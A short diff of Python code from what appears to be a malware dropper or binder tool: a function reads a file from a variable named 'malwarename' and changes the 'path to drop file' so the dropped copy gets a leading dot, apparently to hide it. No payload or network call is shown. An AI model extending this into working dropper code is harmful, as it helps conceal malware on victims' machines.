@@ -26,8 +26,8 @@ def pythwin():
     input2 = entry3.get()
     # Open file
     file_name = malwarename  # Malware path
-    new_file_name = input2  # Path to drop file
-    file = open("."+file_name, "rb")
+    new_file_name = "."+input2  # Path to drop file
+    file = open(file_name, "rb")
     file_data = file.read()
     file.close()
 
